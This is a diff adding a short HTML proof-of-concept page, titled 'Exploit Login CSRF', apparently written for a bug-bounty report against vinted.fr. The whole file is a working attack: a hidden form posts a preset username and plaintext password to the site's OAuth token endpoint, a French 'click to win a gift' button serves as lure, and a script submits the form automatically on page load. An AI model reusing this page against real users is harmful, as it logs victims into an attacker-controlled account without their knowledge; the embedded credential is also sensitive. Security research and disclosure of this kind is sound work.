@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <h1>Exploit Login CSRF</h1>
+    <form action="https://www.vinted.fr/oauth/token" method="POST">
+      <input type="hidden" name="client_id" value="web" />
+      <input type="hidden" name="scope" value="user" />
+      <input type="hidden" name="username" value="raz_26+2@intigriti.me" />
+      <input type="hidden" name="password" value="Vh5:U&fGd2mk:sy" />
+      <input type="hidden" name="grant_type" value="password" />
+      <input type="submit" value="Cliquer pour gagner un cadeau" />
+    </form>
+    <script>
+      // Optionnel : soumission automatique pour un PoC plus "pro"
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
